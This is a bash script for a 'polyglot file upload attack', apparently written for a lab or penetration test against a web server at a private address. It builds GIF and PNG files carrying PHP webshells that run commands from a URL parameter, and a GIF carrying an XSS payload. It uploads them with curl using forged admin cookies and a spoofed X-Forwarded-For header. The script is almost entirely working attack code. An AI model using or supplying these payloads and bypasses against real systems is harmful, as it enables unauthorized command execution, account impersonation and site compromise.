#!/bin/bash
# Polyglot File Upload Attack
# Bypasses image validation by using GIF header with embedded code

TARGET="http://10.210.136.53:3000"
MY_IP="10.0.0.101"

echo "[*] Polyglot File Upload Attack"
echo "[*] Target: $TARGET/profile/upload"
echo ""

# Create polyglot files
echo "[1] Creating polyglot files..."

# GIF + PHP
echo 'GIF89a;<?php system($_GET["cmd"]); ?>' > /tmp/shell.gif
echo "[+] Created shell.gif (GIF header + PHP webshell)"

# GIF + JavaScript
echo 'GIF89a;*/=alert("XSS")/*' > /tmp/xss.gif
echo "[+] Created xss.gif (GIF header + JavaScript)"

# PNG + PHP (IDAT chunk)
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR<?php system($_GET["c"]); ?>' > /tmp/shell.png
echo "[+] Created shell.png (PNG header + PHP)"

echo ""
echo "[2] Uploading polyglot files..."

# Upload GIF shell
curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
    -F "profile_image=@/tmp/shell.gif;type=image/gif" \
    "$TARGET/profile/upload" -o /dev/null -w "shell.gif: HTTP %{http_code}\n"

# Upload XSS GIF
curl -s -H "X-Forwarded-For: $MY_IP" \
    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
    -F "profile_image=@/tmp/xss.gif;type=image/gif" \
    "$TARGET/profile/upload" -o /dev/null -w "xss.gif: HTTP %{http_code}\n"

echo ""
echo "[3] Accessing uploaded files..."
echo ""

echo "shell.gif contents:"
curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/shell.gif" | head -1
echo ""

echo "xss.gif contents:"
curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/xss.gif" | head -1
echo ""

echo "[*] Note: PHP code won't execute on Node.js server"
echo "[*] But polyglot bypass demonstrates lack of content validation"

# Cleanup
rm -f /tmp/shell.gif /tmp/xss.gif /tmp/shell.png
